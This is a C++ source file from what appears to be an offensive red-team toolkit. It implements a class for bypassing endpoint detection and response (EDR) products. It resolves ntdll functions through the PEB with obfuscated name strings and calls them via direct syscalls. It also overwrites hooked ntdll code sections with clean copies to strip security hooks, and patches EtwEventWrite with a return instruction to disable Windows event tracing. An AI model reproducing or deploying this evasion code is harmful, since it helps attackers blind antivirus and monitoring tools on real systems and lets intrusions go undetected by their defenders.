/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include "bypass_av.h"

Bypass_EDR::Bypass_EDR()
{

}

Bypass_EDR::~Bypass_EDR()
{

}

/*
* Functions to access DLL files
*/

HANDLE Bypass_EDR::CreateFileW(LPWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes)
{
	HANDLE h;
	OBJECT_ATTRIBUTES obj = { 0 };
	IO_STATUS_BLOCK isb = { 0 };

	DUNICODE_STRING unicodeString;

	LPWSTR lpFullFileName = (LPWSTR)malloc((10 + wcslen(lpFileName)) * sizeof(wchar_t));
	if (lpFileName[0] != L'\\')
	{
		swprintf_s(lpFullFileName, 10 + wcslen(lpFileName), L"\\??\\\\%s", lpFileName);
	}
	else
	{
		swprintf_s(lpFullFileName, 10 + wcslen(lpFileName), L"%s", lpFileName);
	}

	RtlInitUnicodeString(&unicodeString, lpFullFileName);
	InitializeObjectAttributes(&obj, &unicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);

#if defined(METHOD_NTDLL)
	wchar_t ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	//HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	void* hNtDll = this->GetModuleFromPEB(ntdll_dll_str);
	char ntcreatefile_str[] = { 'N','t','C','r','e','a','t','e','F','i','l','e', 0};
	//_NtCreateFile fNtCreateFile = (_NtCreateFile)GetProcAddress(hNtDll, ntcreatefile_str);
	_NtCreateFile fNtCreateFile = (_NtCreateFile)this->GetAPIFromPEBModule(hNtDll, ntcreatefile_str);

	NTSTATUS status = fNtCreateFile(&h, dwDesiredAccess, &obj, &isb, 0,
		dwFlagsAndAttributes, dwShareMode, dwCreationDisposition,
		FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtCreateFile(&h, dwDesiredAccess, &obj, &isb, 0,
		dwFlagsAndAttributes, dwShareMode, dwCreationDisposition,
		FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
#endif

	free(lpFullFileName);

	if (status != 0)
	{
		printf("Error: %x\n", status);
		return NULL;
	}

	return h;
}

NTSTATUS Bypass_EDR::ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead)
{
	IO_STATUS_BLOCK io;
	memset(&io, 0, sizeof(IO_STATUS_BLOCK));

#if defined(METHOD_NTDLL)
	wchar_t ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	//HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	void* hNtDll = this->GetModuleFromPEB(ntdll_dll_str);
	char ntreadfile_str[] = { 'N','t','R','e','a','d','F','i','l','e', 0 };
	//_NtReadFile fNtReadFile = (_NtReadFile)GetProcAddress(hNtDll, ntreadfile_str);
	_NtReadFile fNtReadFile = (_NtReadFile)this->GetAPIFromPEBModule(hNtDll, ntreadfile_str);

	NTSTATUS status = fNtReadFile(hFile, NULL, NULL, NULL, &io, lpBuffer, nNumberOfBytesToRead, NULL, NULL);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtReadFile(hFile, NULL, NULL, NULL, &io, lpBuffer, nNumberOfBytesToRead, NULL, NULL);
#endif

	*lpNumberOfBytesRead = io.Information;

	return status;
}

BOOL Bypass_EDR::CloseHandle(HANDLE hObject)
{
#if defined(METHOD_NTDLL)
	wchar_t ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	//HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	void* hNtDll = this->GetModuleFromPEB(ntdll_dll_str);
	char ntclose_str[] = { 'N','t','C','l','o','s','e', 0 };
	//_NtClose fNtClose = (_NtClose)GetProcAddress(hNtDll, ntclose_str);
	_NtClose fNtClose = (_NtClose)this->GetAPIFromPEBModule(hNtDll, ntclose_str);

	NTSTATUS status = fNtClose(hObject);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtClose(hObject);
#endif

	if (status == 0)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL Bypass_EDR::VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)
{
	HANDLE process = (HANDLE)-1;
	SIZE_T protect_size = dwSize;

#if defined(METHOD_NTDLL)
	wchar_t ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	//HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	void* hNtDll = this->GetModuleFromPEB(ntdll_dll_str);
	char ntprotectvirtualmemory_str[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0};
	//_NtProtectVirtualMemory fNtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(hNtDll, ntprotectvirtualmemory_str);
	_NtProtectVirtualMemory fNtProtectVirtualMemory = (_NtProtectVirtualMemory)this->GetAPIFromPEBModule(hNtDll, ntprotectvirtualmemory_str);

	NTSTATUS status = fNtProtectVirtualMemory(process, &lpAddress, &protect_size, flNewProtect, lpflOldProtect);
#elif defined(METHOD_SYSCALL_EMBEDDED)  || defined(METHOD_SYSCALL_JUMPER) || defined(METHOD_SYSCALL_JUMPER_RANDOMIZED) || defined(METHOD_SYSCALL_EGG_HUNTER)
	NTSTATUS status = NtProtectVirtualMemory(process, &lpAddress, &protect_size, flNewProtect, lpflOldProtect);
#endif

	if (status == 0)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

void* Bypass_EDR::GetModuleFromPEB(const wchar_t* wModuleName)
{
#if defined(_WIN64)
#define PEBOffset 0x60
#define LdrOffset 0x18
#define ListOffset 0x10
	unsigned long long pPeb = __readgsqword(PEBOffset); // read from the GS register
#elif defined(_WIN32)
#define PEBOffset 0x30
#define LdrOffset 0x0C
#define ListOffset 0x0C
	unsigned long long pPeb = __readfsdword(PEBOffset); 
#endif
	pPeb = *reinterpret_cast<decltype(pPeb)*>(pPeb + LdrOffset);
	PLDR_DATA_TABLE_ENTRY pModuleList = *reinterpret_cast<PLDR_DATA_TABLE_ENTRY*>(pPeb + ListOffset);
	while (pModuleList->DllBase)
	{
		if (!wcscmp(pModuleList->BaseDllName.Buffer, wModuleName))
			return pModuleList->DllBase;
		pModuleList = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pModuleList->InLoadOrderLinks.Flink);
	}
	
	return nullptr;
}

uintptr_t Bypass_EDR::GetAPIFromPEBModule(void* hModule, const char* wAPIName)
{
#if defined(_WIN32)
	unsigned char* lpBase = reinterpret_cast<unsigned char*>(hModule);
	IMAGE_DOS_HEADER* idhDosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(lpBase);
	if (idhDosHeader->e_magic == 0x5A4D)
	{
#if defined(_M_IX86)
		IMAGE_NT_HEADERS32* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS32*>(lpBase + idhDosHeader->e_lfanew);
#elif defined(_M_AMD64)
		IMAGE_NT_HEADERS64* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(lpBase + idhDosHeader->e_lfanew);
#endif
		if (inhNtHeader->Signature == 0x4550)
		{
			IMAGE_EXPORT_DIRECTORY* iedExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(lpBase + inhNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			for (register unsigned int uilter = 0; uilter < iedExportDirectory->NumberOfNames; uilter++)
			{
				char* szNames = reinterpret_cast<char*>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfNames)[uilter]);
				//printf("Function: %s\n", szNames);
				if (!strcmp(szNames, wAPIName))
				{
					unsigned short usOrdinal = reinterpret_cast<unsigned short*>(lpBase + iedExportDirectory->AddressOfNameOrdinals)[uilter];
					return reinterpret_cast<uintptr_t>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfFunctions)[usOrdinal]);
				}
			}
		}
	}

	return 0;
#endif
}


#include <iostream>
void print_buffer(char* address, unsigned int size)
{
	for (int i = 0; i < size; ++i)
		std::cout << std::hex << std::setfill('0') << std::setw(2) << (int)address[i] << " ";
	std::cout << std::endl;
}

int Bypass_EDR::check_dll(const char* dll_name, const char* ntdll_data)
{
	int compare = -1;
	HANDLE process = (HANDLE)-1;

	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA(dll_name);

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {

			int res = memcmp((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdll_data + (DWORD_PTR)hookedSectionHeader->PointerToRawData), hookedSectionHeader->Misc.VirtualSize);
			if (res == 0)
			{
				compare = 0;
			}
			else
			{
				compare = 1;
			}
		}
	}

	//CloseHandle(process);
	FreeLibrary(ntdllModule);

	return compare;
}

BOOL Bypass_EDR::unhook_dll(const char* dll_name, const char* ntdll_data)
{
	//HANDLE process = GetCurrentProcess();
	HANDLE process = (HANDLE)-1;

	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA(dll_name);

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = this->VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdll_data + (DWORD_PTR)hookedSectionHeader->PointerToRawData), hookedSectionHeader->Misc.VirtualSize);
			isProtected = this->VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	//CloseHandle(process);
	FreeLibrary(ntdllModule);

	return TRUE;
}

BOOL Bypass_EDR::disable_etw()
{
	// Get the EventWrite function
	wchar_t ntdll_dll_str[] = { 'n','t','d','l','l','.','d','l','l', 0 };
	//HMODULE hNtDll = LoadLibraryA(ntdll_dll_str);
	void* hNtDll = this->GetModuleFromPEB(ntdll_dll_str);
	char etweventwrite_str[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
	//void* eventWrite = GetProcAddress(hNtDll, etweventwrite_str);
	void* eventWrite = (void*)this->GetAPIFromPEBModule(hNtDll, etweventwrite_str);

	DWORD oldProt;
	// Allow writing to page
	this->VirtualProtect(eventWrite, 4, PAGE_EXECUTE_READWRITE, &oldProt);

#if defined(_M_IX86)
	// Patch with "ret 14" on x86
	memcpy(eventWrite, "\xc2\x14\x00\x00", 4);
#elif defined(_M_AMD64)
	// source : https://github.com/ScriptIdiot/BOF-patchit/blob/main/patchit.c
	memcpy(eventWrite, "\xc3", 1);
#endif

	DWORD oldOldProt;
	// Return memory to original protection
	this->VirtualProtect(eventWrite, 4, oldProt, &oldOldProt);

	return TRUE;
}